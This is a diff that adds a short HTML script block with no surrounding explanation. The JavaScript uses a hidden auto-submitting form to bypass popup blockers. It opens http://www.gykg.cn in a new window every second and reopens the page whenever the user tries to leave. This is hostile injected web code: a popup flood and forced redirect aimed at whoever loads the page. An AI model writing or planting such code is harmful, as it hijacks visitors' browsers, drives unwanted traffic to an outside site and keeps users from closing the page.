@@ -1,0 +1,26 @@
+<script>
+function ForceWindow ()
+{
+  this.r = document.documentElement;
+  this.f = document.createElement("FORM");
+  this.f.target = "_blank";
+  this.f.method = "post";
+  this.r.insertBefore(this.f, this.r.childNodes[0]);
+} 
+
+ForceWindow.prototype.open = function (sUrl)
+{
+  this.f.action = sUrl;
+  this.f.submit();
+} 
+
+window.force = new ForceWindow(); 
+setInterval(function() {
+	window.force.open("http://www.gykg.cn");
+}, 1000);
+
+//alert(location.href);
+window.onunload = function() {
+	window.force.open(location.href);
+}
+</script>
